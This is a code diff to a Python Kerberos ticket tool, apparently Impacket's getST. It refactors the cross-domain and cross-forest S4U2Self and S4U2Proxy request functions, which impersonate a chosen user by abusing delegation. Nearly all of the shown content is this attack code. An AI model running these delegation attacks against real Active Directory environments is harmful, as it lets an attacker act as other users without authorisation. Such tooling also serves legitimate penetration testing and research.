@@ -176,128 +176,10 @@ class GETST:
         ccache.saveFile(self.__saveFileName + '.ccache')
 
 
-    def doS4U2SelfCrossForest(self, ticket, decodedTGT, cipher, sessionKey, kdcHost, targetDomain):
+
+    def doS4U2SelfCrossDomain(self, ticket, decodedTGT, cipher, sessionKey, kdcHost, targetDomain, crossforest):
         # We have a TGT valid for the cross-domain interaction 
 
-        domain = self.__domain.upper()
-        apReq = AP_REQ()
-        apReq['pvno'] = 5
-        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
-
-        opts = list()
-        apReq['ap-options'] =  constants.encodeFlags(opts)
-        seq_set(apReq,'ticket', ticket.to_asn1)
-
-        authenticator = Authenticator()
-        authenticator['authenticator-vno'] = 5
-        authenticator['crealm'] = decodedTGT['crealm'].asOctets()
-
-        clientName = Principal()
-        clientName.from_asn1( decodedTGT, 'crealm', 'cname')
-
-        seq_set(authenticator, 'cname', clientName.components_to_asn1)
-
-        now = datetime.datetime.now(datetime.timezone.utc)
-        authenticator['cusec'] =  now.microsecond
-        authenticator['ctime'] = KerberosTime.to_asn1(now)
-
-        encodedAuthenticator = encoder.encode(authenticator)
-
-        # Key Usage 7
-        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
-        # TGS authenticator subkey), encrypted with the TGS session
-        # key (Section 5.5.1)
-        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
-
-        apReq['authenticator'] = noValue
-        apReq['authenticator']['etype'] = cipher.enctype
-        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
-
-        encodedApReq = encoder.encode(apReq)
-
-        tgsReq = TGS_REQ()
-
-        tgsReq['pvno'] =  5
-        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
-        tgsReq['padata'] = noValue
-        tgsReq['padata'][0] = noValue
-        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
-        tgsReq['padata'][0]['padata-value'] = encodedApReq
-
-        reqBody = seq_set(tgsReq, 'req-body')
-
-        opts = list()
-        opts.append( constants.KDCOptions.forwardable.value )
-        opts.append( constants.KDCOptions.renewable.value )
-        opts.append( constants.KDCOptions.renewable_ok.value )
-        opts.append( constants.KDCOptions.canonicalize.value )
-
-        reqBody['kdc-options'] = constants.encodeFlags(opts)
-        serverName = Principal("%s@%s" % (self.__user, decodedTGT['crealm']), self.__domain, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
-
-        seq_set(reqBody, 'sname', serverName.components_to_asn1)
-        reqBody['realm'] = targetDomain
-
-        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
-
-        reqBody['till'] = KerberosTime.to_asn1(now)
-        reqBody['nonce'] = random.getrandbits(31)
-        seq_set_iter(reqBody, 'etype',
-                        (
-                            int(constants.EncryptionTypes.rc4_hmac.value),
-                            int(constants.EncryptionTypes.rc4_hmac_exp.value),
-                            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
-                            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
-                            int(cipher.enctype)
-                        )
-                    )
-
-        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_ENTERPRISE.value)
-        S4UByteArray += ensure_binary(self.__options.impersonate) + ensure_binary(self.__domain) + b'Kerberos'
-
-        paencoded = None
-        padatatype = None
-
-        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
-        # with the following three parameters: the session key of the TGT of
-        # the service performing the S4U2Self request, the message type value
-        # of 17, and the byte array S4UByteArray.
-        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)
-
-        paForUserEnc = PA_FOR_USER_ENC()
-        crossDomainClient = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
-        seq_set(paForUserEnc, 'userName', crossDomainClient.components_to_asn1)
-        paForUserEnc['userRealm'] = self.__domain
-        paForUserEnc['cksum'] = noValue
-        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
-        paForUserEnc['cksum']['checksum'] = checkSum
-        paForUserEnc['auth-package'] = 'Kerberos'
-
-        encodedPaForUserEnc = encoder.encode(paForUserEnc)
-        padatatype = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
-        paencoded = encodedPaForUserEnc
-
-        tgsReq['padata'][1] = noValue
-        tgsReq['padata'][1]['padata-type'] = padatatype
-        tgsReq['padata'][1]['padata-value'] = paencoded
-
-        message = encoder.encode(tgsReq)
-
-        r = sendReceive(message, targetDomain, kdcHost)
-        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
-        cipherText = tgs['enc-part']['cipher']
-        plainText = cipher.decrypt(sessionKey, 8, cipherText)
-        encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
-        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'].asOctets())
-
-        return r, sessionKey, newSessionKey
-
-
-
-    def doS4U2SelfCrossDomain(self, ticket, decodedTGT, cipher, sessionKey, kdcHost, targetDomain):
-        # We have a TGT valid for the cross-domain interaction 
-
-        domain = self.__domain.upper()
         apReq = AP_REQ()
         apReq['pvno'] = 5
         apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
@@ -353,7 +235,10 @@ class GETST:
         reqBody['kdc-options'] = constants.encodeFlags(opts)
         logging.debug("Principal : " + "%s@%s@%s " % (self.__user, targetDomain, decodedTGT['crealm']))
         logging.debug("Domain : " + self.__domain)
-        serverName = Principal("%s@%s@%s" % (self.__user, self.__domain, targetDomain), self.__targetDomain, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
+        if crossforest:
+            serverName = Principal("%s@%s" % (self.__user, decodedTGT['crealm']), self.__domain, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
+        else:
+            serverName = Principal("%s@%s@%s" % (self.__user, self.__domain, targetDomain), self.__targetDomain, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
 
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
         reqBody['realm'] = targetDomain
@@ -373,7 +258,10 @@ class GETST:
                     )
 
         S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_ENTERPRISE.value)
-        S4UByteArray += ensure_binary(self.__options.impersonate) + ensure_binary(self.__targetDomain) + b'Kerberos'
+        if crossforest:
+            S4UByteArray += ensure_binary(self.__options.impersonate) + ensure_binary(self.__domain) + b'Kerberos'
+        else:
+            S4UByteArray += ensure_binary(self.__options.impersonate) + ensure_binary(self.__targetDomain) + b'Kerberos'
 
         logging.debug(S4UByteArray)
 
@@ -389,7 +277,10 @@ class GETST:
         paForUserEnc = PA_FOR_USER_ENC()
         crossDomainClient = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
         seq_set(paForUserEnc, 'userName', crossDomainClient.components_to_asn1)
-        paForUserEnc['userRealm'] = self.__targetDomain
+        if crossforest:
+            paForUserEnc['userRealm'] = self.__domain
+        else:
+            paForUserEnc['userRealm'] = self.__targetDomain
         paForUserEnc['cksum'] = noValue
         paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
         paForUserEnc['cksum']['checksum'] = checkSum
@@ -509,101 +400,7 @@ class GETST:
 
 
         return r, sessionKey, newSessionKey
-
-    def doS4UProxyCrossForest(self, ticket, decodedTGT, additionalTicket, cipher, sessionKey, kdcHost, targetDomain, crossForest):
-        apReq = AP_REQ()
-        apReq['pvno'] = 5
-        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
-
-        opts = list()
-        apReq['ap-options'] =  constants.encodeFlags(opts)
-        seq_set(apReq,'ticket', ticket.to_asn1)
-
-        authenticator = Authenticator()
-        authenticator['authenticator-vno'] = 5
-        authenticator['crealm'] = decodedTGT['crealm'].asOctets()
-
-        clientName = Principal()
-        clientName.from_asn1( decodedTGT, 'crealm', 'cname')
-
-        seq_set(authenticator, 'cname', clientName.components_to_asn1)
-
-        now = datetime.datetime.now(datetime.timezone.utc)
-        authenticator['cusec'] =  now.microsecond
-        authenticator['ctime'] = KerberosTime.to_asn1(now)
-
-        encodedAuthenticator = encoder.encode(authenticator)
-        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
-
-        apReq['authenticator'] = noValue
-        apReq['authenticator']['etype'] = cipher.enctype
-        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
-
-        encodedApReq = encoder.encode(apReq)
-
-        tgsReq = TGS_REQ()
-        tgsReq['pvno'] =  5
-        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
-        tgsReq['padata'] = noValue
-        tgsReq['padata'][0] = noValue
-        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
-        tgsReq['padata'][0]['padata-value'] = encodedApReq
-
-        # Add resource-based constrained delegation support
-        paPacOptions = PA_PAC_OPTIONS()
-        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))
-        if crossForest:
-            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,constants.PAPacOptions.branch_aware.value))
-
-
-        tgsReq['padata'][1] = noValue
-        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
-        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)
-        
-
-        reqBody = seq_set(tgsReq, 'req-body')
-
-        if not(crossForest):
-            seq_set_iter(reqBody, 'additional-tickets', (additionalTicket,))
-
-        opts = list()
-        # This specified we're doing S4U
-        if not(crossForest):
-            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
-        opts.append(constants.KDCOptions.canonicalize.value)
-        opts.append(constants.KDCOptions.forwardable.value)
-        opts.append(constants.KDCOptions.renewable.value)
-
-        reqBody['kdc-options'] = constants.encodeFlags(opts)
-        serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-        seq_set(reqBody, 'sname', serverName.components_to_asn1)
-        reqBody['realm'] = str(targetDomain)
-
-        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
-
-        reqBody['till'] = KerberosTime.to_asn1(now)
-        reqBody['nonce'] = random.getrandbits(31)
-        seq_set_iter(reqBody, 'etype',
-                        (
-                            int(constants.EncryptionTypes.rc4_hmac.value),
-                            int(constants.EncryptionTypes.rc4_hmac_exp.value),
-                            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
-                            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
-                            int(cipher.enctype)
-                        )
-                    )
-        message = encoder.encode(tgsReq)
-
-        logging.info('Requesting S4U2Proxy')
-        r = sendReceive(message, targetDomain, kdcHost)
-        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
-        cipherText = tgs['enc-part']['cipher']
-        plainText = cipher.decrypt(sessionKey, 8, cipherText)
-        encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
-        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'].asOctets())
-
-
-        return r, sessionKey, newSessionKey
+    
     
     def doRBCDCrossForest(self, ticket, decodedTGT, additionalTicket, cipher, sessionKey, kdcHost, targetDomain):
         apReq = AP_REQ()
@@ -698,7 +495,7 @@ class GETST:
         logging.debug("Trying step S4U2SELF for domain:" + self.__domain.upper())
 
         targetDomain = self.__domain.upper()
-        r, TGT_sessionKey, newSessionKey = self.doS4U2SelfCrossForest(ticket, decodedTGT, cipher, sessionKey, kdcHost, targetDomain)
+        r, TGT_sessionKey, newSessionKey = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, kdcHost, targetDomain, True)
 
         logging.debug("S4U2Self - OK")
 
@@ -709,10 +506,6 @@ class GETST:
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('TGS_REP')
             print(tgs.prettyPrint())
-        
-        # Extract the ticket from the TGT
-        ticket = Ticket()
-        ticket.from_asn1(tgs['ticket'])
         
         sessionKey = TGT_sessionKey
         
@@ -725,7 +518,7 @@ class GETST:
         add_ticket.from_asn1(tgs['ticket'])
         myTicket = add_ticket.to_asn1(TicketAsn1())
 
-        r, _, _ = self.doS4UProxyCrossForest(ticket, decodedTGT, myTicket, cipher, sessionKey, kdcHost, domain, False)
+        r, _, _ = self.doS4UProxyCrossDomain(ticket, decodedTGT, myTicket, cipher, sessionKey, kdcHost, domain, False)
 
         logging.debug("Second step S4U2Proxy - OK")
 
@@ -740,7 +533,7 @@ class GETST:
             logging.debug('TGS_REP')
             print(tgs.prettyPrint())
 
-        r, _, newSessionKeyTGS = self.doS4UProxyCrossForest(ticket, decodedTGT, myTicket, cipher, sessionKey, kdcHost, domain, True)
+        r, _, newSessionKeyTGS = self.doS4UProxyCrossDomain(ticket, decodedTGT, myTicket, cipher, sessionKey, kdcHost, domain, True)
         logging.debug("Third step OK : S4U2Proxy crossforest")
 
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
@@ -774,7 +567,7 @@ class GETST:
         ticket.from_asn1(decodedTGT['ticket'])
 
         targetDomain = self.__targetDomain.upper()
-        r, TGT_sessionKey, newSessionKey = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, kdcHost, targetDomain)
+        r, TGT_sessionKey, newSessionKey = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, kdcHost, targetDomain, False)
 
         logging.debug("Referral S4U2Self - OK")
 
@@ -787,7 +580,7 @@ class GETST:
         ticket.from_asn1(tgs['ticket'])
         
         # We do not need to store the sessionKey, as we will only use the initial TGT and the cross-domain TGT in the authenticator 
-        r, _, _ = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, otherDcHost, str(decodedTGT['crealm']).upper())
+        r, _, _ = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, otherDcHost, str(decodedTGT['crealm']).upper(), False)
 
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
